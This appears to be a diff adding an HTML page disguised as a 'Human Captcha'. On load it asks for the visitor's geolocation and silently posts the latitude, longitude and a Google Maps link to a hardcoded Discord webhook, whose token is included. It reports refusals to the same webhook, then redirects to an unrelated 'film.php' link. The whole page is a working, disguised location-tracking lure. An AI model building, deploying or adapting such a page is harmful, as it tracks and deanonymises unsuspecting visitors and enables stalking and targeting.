@@ -1,0 +1,72 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Human Captcha</title>
+    <style>
+        body {
+            background: url('https://blog.sucuri.net/wp-content/uploads/2022/12/spam-pop-up-wordpress-pages-1180x812.png') no-repeat center center fixed;
+            background-size: cover;
+            margin: 0;
+            height: 100vh;
+        }
+
+        /* Ensures the background image adjusts for smaller screens */
+        @media (max-width: 768px) {
+            body {
+                background-size: contain;
+                background-repeat: no-repeat;
+                background-attachment: scroll;
+            }
+        }
+    </style>
+</head>
+<body>
+    <script>
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const webhookURL = "https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX";
+                        
+                        const data = {
+                            content: `📍 **New Location Shared!**\n🌍 Latitude: ${latitude}\n🌏 Longitude: ${longitude}\n[📌 View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`
+                        };
+
+                        fetch(webhookURL, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(data)
+                        })
+                        .then(() => {
+                            console.log("Location sent successfully!");
+                            window.location.replace("https://mymap.quest/film.php?\\Eli//=9MUDJT.ext");  // Use replace for the redirect
+                        })
+                        .catch(() => console.log("Failed to send location."));
+                    },
+                    () => {
+                        console.log("Location permission denied.");
+                        
+                        fetch("https://discord.com/api/webhooks/1310096225961250816/HuldPFlYUqeQHYOtEGYDkVxr2OC3DTQKt6gPPwRpjwkPdOUYRcRAFvsbOKPAFnIcYjYX", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({ content: "🚨 User denied location access!" })
+                        });
+
+                        // Redirect to your main page if location is denied
+                        window.location.replace("https://mymap.quest/film.php?\\Eli//=9MUDJT.ext");  // Use replace for the redirect
+                    }
+                );
+            } else {
+                console.log("Geolocation is not supported by this browser.");
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            sendLocation();
+        });
+    </script>
+
+
+<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"></div></body></html>
